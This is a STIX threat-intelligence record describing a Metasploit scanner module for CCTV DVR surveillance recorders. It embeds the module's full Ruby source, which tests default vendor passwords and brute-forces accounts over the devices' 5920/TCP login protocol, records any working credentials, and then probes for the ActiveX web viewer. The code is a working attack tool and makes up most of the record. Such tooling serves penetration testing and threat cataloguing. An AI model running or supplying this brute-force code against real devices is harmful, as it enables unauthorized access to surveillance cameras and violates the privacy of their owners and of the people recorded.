{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cbf29c2c-5655-426b-9213-1385c778eb07",
    "created": "2024-08-14T16:27:06.934625Z",
    "modified": "2024-08-14T16:27:06.934629Z",
    "name": "CCTV DVR Login Scanning Utility",
    "description": " This module tests for standalone CCTV DVR video surveillance deployments specifically by MicroDigital, HIVISION, CTRing, and numerous other rebranded devices that are utilizing default vendor passwords. Additionally, this module has the ability to brute force user accounts.  Such CCTV DVR video surveillance deployments support remote viewing through Central Management Software (CMS) via the CMS Web Client, an IE ActiveX control hosted over HTTP, or through Win32 or mobile CMS client software. By default remote authentication is handled over port 5920/TCP with video streaming over 5921/TCP.  After successful authentication over 5920/TCP this module will then attempt to determine if the IE ActiveX control is listening on the default HTTP port (80/TCP). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/cctv_dvr_login.rb",
            "external_id": "cctv_dvr_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'CCTV DVR Login Scanning Utility',\n      'Description' => %q{\n        This module tests for standalone CCTV DVR video surveillance\n        deployments specifically by MicroDigital, HIVISION, CTRing, and\n        numerous other rebranded devices that are utilizing default vendor\n        passwords. Additionally, this module has the ability to brute\n        force user accounts.\n\n        Such CCTV DVR video surveillance deployments support remote\n        viewing through Central Management Software (CMS) via the\n        CMS Web Client, an IE ActiveX control hosted over HTTP, or\n        through Win32 or mobile CMS client software. By default,\n        remote authentication is handled over port 5920/TCP with video\n        streaming over 5921/TCP.\n\n        After successful authentication over 5920/TCP this module\n        will then attempt to determine if the IE ActiveX control\n        is listening on the default HTTP port (80/TCP).\n      },\n      'Author'      => 'Justin Cacak',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      OptPath.new(\n        'USER_FILE',\n        [\n          false,\n          \"File containing usernames, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"multi_vendor_cctv_dvr_users.txt\")\n        ]),\n      OptPath.new(\n        'PASS_FILE',\n        [\n          false,\n          \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"multi_vendor_cctv_dvr_pass.txt\")\n        ]),\n      OptBool.new('STOP_ON_SUCCESS', [false, \"Stop guessing when a credential works for a host\", true]),\n      OptPort.new('HTTP_PORT', [true, \"The HTTP port for the IE ActiveX web client interface\", 80]),\n      Opt::RPORT(5920)\n    ])\n  end\n\n  def run_host(ip)\n    @valid_hosts = []\n    begin\n      connect\n\n      each_user_pass { |user, pass|\n        do_login(user, pass)\n      }\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error(\"Timeout or no connection on #{rhost}:#{rport}\")\n      return\n    rescue ::Exception => e\n      print_error(\"#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}\")\n      return\n    ensure\n      disconnect\n    end\n\n    @valid_hosts.each do |h|\n      http_interface_check(h)\n    end\n\n  end\n\n  def http_interface_check(h)\n    begin\n      http = connect(false, {\n        'RPORT' => datastore['HTTP_PORT'],\n        'RHOST' => h\n      })\n\n      http.put(\"GET / HTTP/1.1\\r\\n\\r\\n\")\n\n      # get() is a more suitable method than get_once in this case\n      data = http.get(20)\n\n      if data =~ /DVR WebViewer/i\n        # Confirmed ActiveX control over HTTP, display the control name and version\n        # Report HTTP service info since there is a confirmed IE ActiveX control\n        # Code base example:\n        # codebase=\"CtrWeb.cab#version=1,1,5,4\"\n        if data.match(/codebase=\"(\\w{1,16})\\.(\\w{1,3}).version=(\\d{1,3},\\d{1,3},\\d{1,3},\\d{1,3})/)\n          v   = \"#{$1}.#{$2} v#{$3}\"\n        else\n          v   = \"unknown version\"\n        end\n\n        uri = \"http://#{rhost}:#{datastore['HTTP_PORT']}\"\n        print_good(\"Confirmed IE ActiveX HTTP interface (#{v}): #{uri}\")\n\n        report_service(\n          :host => rhost,\n          :port => datastore['HTTP_PORT'],\n          :name => \"http\",\n          :info => \"IE ActiveX CCTV DVR Control (#{v})\"\n        )\n      else\n        # An HTTP server is listening on HTTP_PORT, however, does not appear to be\n        # the ActiveX control\n        print_status(\"An unknown HTTP interface was found on #{datastore['HTTP_PORT']}/TCP\")\n      end\n\n    rescue\n      print_status(\"IE ActiveX HTTP interface not found on #{datastore['HTTP_PORT']}/TCP\")\n    ensure\n      disconnect(http)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'cctv_dvr',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user=nil, pass=nil)\n    vprint_status(\"#{rhost} - Trying username:'#{user}' with password:'#{pass}'\")\n\n    fill_length1 = 64 - user.length\n\n    # Check if user name length is too long for submission (exceeds packet length)\n    if fill_length1 < 1\n      return\n    end\n\n    # Build the authentication packet starting here\n    data = \"\\x00\\x01\\x00\\x00\\x80\\x00\\x00\\x00\" + user + (\"\\x00\" * fill_length1)\n\n    # Check if password length is too long for submission (exceeds packet length)\n    fill_length2 = 64 - pass.length\n    if fill_length2 < 1\n      return\n    end\n\n    data = data + pass + (\"\\x00\" * fill_length2)\n    res = nil\n    sock.put(data)\n    begin\n      res = sock.get_once(-1, 7)\n    rescue\n      return :abort\n    end\n\n    if not (res)\n      disconnect\n      vprint_error(\"#{rhost}  No Response\")\n      return :abort\n    end\n\n    # Analyze the response\n    if res == \"\\x00\\x01\\x03\\x01\\x00\\x00\\x00\\x00\"  #Failed Password\n      vprint_error(\"#{rhost}:#{rport}  Failed login as: '#{user}'\")\n      return\n\n    elsif res ==\"\\x00\\x01\\x02\\x01\\x00\\x00\\x00\\x00\" #Invalid User\n      vprint_error(\"#{rhost}:#{rport}  Invalid user: '#{user}'\")\n      # Stop attempting passwords for this user since it doesn't exist\n      return :skip_user\n\n    elsif res ==\"\\x00\\x01\\x05\\x01\\x00\\x00\\x00\\x00\" or res ==\"\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00\"\n      print_good(\"#{rhost}:#{rport}  Successful login: '#{user}' : '#{pass}'\")\n\n      # Report valid credentials under the CCTV DVR admin port (5920/TCP).\n      # This is a proprietary protocol.\n      report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.inspect)\n\n      @valid_hosts << rhost\n      return :next_user\n\n    else\n      vprint_error(\"#{rhost}:#{rport}  Failed login as: '#{user}' - Unclassified Response: #{res.inspect}\")\n      return\n    end\n\n  end\nend\n"
}